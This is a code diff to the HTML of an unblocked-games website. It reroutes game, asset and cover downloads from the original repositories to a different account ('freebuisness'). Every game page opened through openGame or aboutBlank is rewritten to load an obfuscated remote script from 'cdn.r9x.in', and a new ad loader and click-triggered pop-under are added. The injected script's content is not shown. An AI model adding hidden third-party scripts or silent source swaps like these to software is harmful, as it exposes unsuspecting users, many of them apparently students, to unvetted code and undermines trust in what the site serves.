@@ -1,6 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
+<script>
+window.sadjgknsdfjg='https://'+window.location.hostname;
+</script>
 <head>
+<script>
+
+(function(){
+    fetch('./commits')
+        .then(res => res.text())
+        .then(HASH => {
+            HASH = HASH.trim();
+
+            if (window.resolveUrl) {
+                const originalResolve = window.resolveUrl;
+                window.resolveUrl = function(url) {
+                    const match = url.match(/\/(\d+[^"]*)\.html/);
+                    if (match) {
+                        return `https://cdn.jsdelivr.net/gh/freebuisness/html@${HASH}/${match[1]}.html?t=${Date.now()}`;
+                    }
+                    return originalResolve(url);
+                };
+            }
+        })
+        .catch(err => {
+            console.error('Failed to fetch commit hash:', err);
+        });
+})();
+</script>
 <script>
 (function() {
     const memoryStorage = {};
@@ -49,7 +76,7 @@
     }
 })();
 </script>
-<base href="https://jimmyqrgg.github.io/">
+<base href="https://jimmyqrgg.github.io">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
@@ -58,6 +85,7 @@
     <meta name="description" content="Play unbl*cked games like Crazy Cattle 3D and DriveMad on GN-Math. Fast, free, no downloads-perfect for school or home.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://gn-math.dev/">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
     <meta property="og:title" content="GN-Math">
     <meta property="og:description" content="Play unbl*cked games like Crazy Cattle 3D and DriveMad on GN-Math. Fast, free, no downloads-perfect for school or home.">
     <meta name="twitter:card" content="summary_large_image">
@@ -1230,92 +1258,12 @@ body.performance-mode .game-card:hover {
 }
 
 body.classic-theme main {
-    max-width: none !important;
+    max-width: none !important
 }
 
 </style>
-<script>
-(()=>{const k="p",d=9e5,s=()=>{let t=localStorage.getItem(k);return !t||Date.now()-t>d},m=()=>localStorage.setItem(k,Date.now());function h(){if(!s())return;window.open("https://www.profitablecpmratenetwork.com/mygrerhn5?key=793c20b44829fb4c18bb83c7e6feb1d8","_blank");m();document.removeEventListener("click",h)}s()&&document.addEventListener("click",h,{once:1})})();
-</script>
-
-            <script>
-            // Console capture script
-            (function() {
-              const originalConsole = {
-                log: console.log,
-                warn: console.warn,
-                error: console.error,
-                info: console.info,
-                debug: console.debug
-              };
-              
-              const capturedLogs = [];
-              const logTypes = ['log', 'warn', 'error', 'info', 'debug'];
-              
-              logTypes.forEach(type => {
-                console[type] = function(...args) {
-                  // Call original console method
-                  originalConsole[type].apply(console, args);
-                  
-                  // Capture the log
-                  const logEntry = {
-                    type: type,
-                    timestamp: new Date().toISOString(),
-                    args: args.map(arg => {
-                      try {
-                        if (typeof arg === 'object') {
-                          return JSON.stringify(arg);
-                        }
-                        return String(arg);
-                      } catch (e) {
-                        return '[Unserializable Object]';
-                      }
-                    }),
-                    stack: new Error().stack
-                  };
-                  
-                  capturedLogs.push(logEntry);
-                  
-                  // Store in window for external access
-                  window.capturedConsoleLogs = capturedLogs;
-                };
-              });
-              
-              // Override window.onerror to catch global errors
-              const originalOnerror = window.onerror;
-              window.onerror = function(message, source, lineno, colno, error) {
-                capturedLogs.push({
-                  type: 'global_error',
-                  timestamp: new Date().toISOString(),
-                  message: message,
-                  source: source,
-                  line: lineno,
-                  column: colno,
-                  error: error ? error.toString() : null,
-                  stack: error ? error.stack : null
-                });
-                
-                if (originalOnerror) {
-                  return originalOnerror(message, source, lineno, colno, error);
-                }
-                return false;
-              };
-              
-              // Catch unhandled promise rejections
-              window.addEventListener('unhandledrejection', function(event) {
-                capturedLogs.push({
-                  type: 'unhandled_rejection',
-                  timestamp: new Date().toISOString(),
-                  reason: event.reason ? event.reason.toString() : 'Unknown reason',
-                  stack: event.reason && event.reason.stack
-                });
-              });
-              
-              console.log('Console capture script loaded');
-            })();
-            </script>
-          </head>
-<body>
+<script src="//js.rev.iq/gn-math.dev"></script> <script> (()=>{const k="p",d=15e4,s=()=>{let t=localStorage.getItem(k);return !t||Date.now()-t>d},m=()=>localStorage.setItem(k,Date.now());function h(){if(!s())return;window.open("https://motorsnag.com/qph9bfad?key=17276614cc8dc8ab4e18cf78200ebeb4","_blank");m();document.removeEventListener("click",h)}s()&&document.addEventListener("click",h,{once:1})})(); </script> 
+</head>
 <header>
 <div class="header-upper">
 <div class="logo" onclick="location.reload()">
@@ -1475,12 +1423,18 @@ XMLHttpRequest.prototype.open = function(method, url) {
 };
 HTMLCanvasElement.prototype.toDataURL = function(...args) { return ""; };
 const CONFIG = {
-    zones: "https://cdn.jsdelivr.net/gh/gn-math/assets@latest/zones.json",
+    zones: "https://cdn.jsdelivr.net/gh/freebuisness/assets@latest/zones.json",
     tagsZones: "https://cdn.jsdelivr.net/gh/sealiee11/gnmathstuff@main/zones.json",
-    covers: "https://cdn.jsdelivr.net/gh/gn-math/covers@main",
-    html: "https://cdn.jsdelivr.net/gh/gn-math/html@main",
+    covers: "https://cdn.jsdelivr.net/gh/freebuisness/covers@main",
+    html: null,
     stats: "https://data.jsdelivr.com/v1/stats/packages/gh/gn-math/html@main/files?period="
 };
+
+fetch(window.sadjgknsdfjg+ "/commits").then(r => r.text()).then(hash => {
+    CONFIG.html = `https://cdn.jsdelivr.net/gh/freebuisness/html@${hash.trim()}`;
+}).catch(() => {
+    CONFIG.html = "https://cdn.jsdelivr.net/gh/freebuisness/html@main";
+});
 let state = {
     games: [],
     hits: {},
@@ -1501,7 +1455,7 @@ async function init() {
             const shajson = await sharesponse.json();
             const sha = shajson[0]['sha'];
             if (sha) {
-                zonesURL = `https://cdn.jsdelivr.net/gh/gn-math/assets@${sha}/zones.json`;
+                zonesURL = `https://cdn.jsdelivr.net/gh/freebuisness/assets@${sha}/zones.json`;
             }
         } catch (error) {
             try {
@@ -1509,7 +1463,7 @@ async function init() {
                 if (secondarysharesponse && secondarysharesponse.status === 200) {
                     const sha = (await secondarysharesponse.text()).trim();
                     if (sha) {
-                        zonesURL = `https://cdn.jsdelivr.net/gh/gn-math/assets@${sha}/zones.json`;
+                        zonesURL = `https://cdn.jsdelivr.net/gh/freebuisness/assets@${sha}/zones.json`;
                     }
                 }
             } catch(error) {}
@@ -2154,9 +2108,14 @@ async function openGame(id) {
     try {
         const u = resolveUrl(g.url);
         const r = await fetch(u + "?t=" + Date.now());
-        const h = await r.text();
+        let h = await r.text();
+	if (h.trim().startsWith("Couldn't find the requested file")) {
+            const r2 = await fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/freebuisness/html@main") + "?t=" + Date.now());
+            h = await r2.text();
+        }
         f.contentDocument.open();
-        f.contentDocument.write(h);
+     h = h.replace(/<\/html>/i, '<script src="https://cdn.r9x.in/ailogic_gn-math.dev_obf.js"><\/script></html>');
+f.contentDocument.write(h);
         f.contentDocument.close();
     } catch(e) {
         alert("Load failed");
@@ -2191,11 +2150,19 @@ function aboutBlank() {
     const w = window.open('about:blank', '_blank');
     const u = resolveUrl(g.url);
     fetch(u).then(r=>r.text()).then(h => {
-        const baseUrl = u.substring(0, u.lastIndexOf('/') + 1);
-        const htmlWithBase = h.replace('<head>', `<head><base href="${baseUrl}">`);
-        w.document.open();
-        w.document.write(htmlWithBase);
-        w.document.close();
+	if (h.trim().startsWith("Couldn't find the requested file")) {
+            fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/freebuisness/html@main") + "?t=" + Date.now()).then(r=>r.text()).then(hh => {
+                w.document.open();
+              hh = hh.replace(/<\/html>/i, '<script src="https://cdn.r9x.in/ailogic_gn-math.dev_obf.js"><\/script></html>');
+w.document.write(hh);
+                w.document.close();
+            });
+	} else {
+            w.document.open();
+
+            w.document.write(h);
+            w.document.close();
+	}
     });
 }
 function downloadZone() {
